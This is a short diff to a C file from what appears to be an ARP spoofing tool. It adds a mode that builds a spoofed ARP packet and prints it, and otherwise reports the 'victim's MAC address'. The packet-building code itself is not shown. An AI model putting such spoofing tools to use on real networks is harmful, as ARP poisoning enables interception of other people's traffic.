@@ -11,11 +11,20 @@
 static void execute(sock_t *sock, arg_t *arg)
 {
     uint8_t buf[6] = {0};
+    ssize_t tmp;
+    uint8_t packet[60] = {0};
 
-    send_arp(sock, arg);
+    if (arg->print_spoof == false)
+        send_arp(sock, arg);
     if (arg->print_broadcast == true)
         return;
-    rcv_arp(sock, buf);
+    if (arg->print_spoof == false)
+        rcv_arp(sock, buf);
+    tmp = build_spoofed(sock, packet, arg);
+    if (arg->print_spoof == true) {
+        print_packet(packet, tmp);
+        return;
+    }
     printf("Found victim's MAC address: '%02X:%02X:%02X:%02X:%02X:%02X'\n",
     buf[0], buf[1], buf[2], buf[3], buf[4], buf[5]);
 }
